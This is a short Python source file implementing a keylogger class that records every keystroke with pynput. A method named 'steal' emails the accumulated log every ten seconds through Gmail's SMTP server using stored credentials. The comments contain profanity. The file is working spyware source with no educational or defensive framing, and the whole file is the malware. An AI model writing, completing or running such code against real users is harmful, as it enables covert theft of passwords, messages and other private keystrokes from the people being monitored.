import os
import pynput.keyboard
import threading
import smtplib

#I HATE THIS FUCKING CODE.....!!
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Fucking Shit...! running Now.."
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def key_process(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " " 
        self.append_to_log(current_key)

    def steal(self):
        self.sml(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(10, self.steal)
        timer.start()
    
    def sml(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


    def start(self):
        key_capture = pynput.keyboard.Listener(on_press=self.key_process)
        with key_capture:
            self.steal()
            key_capture.join()
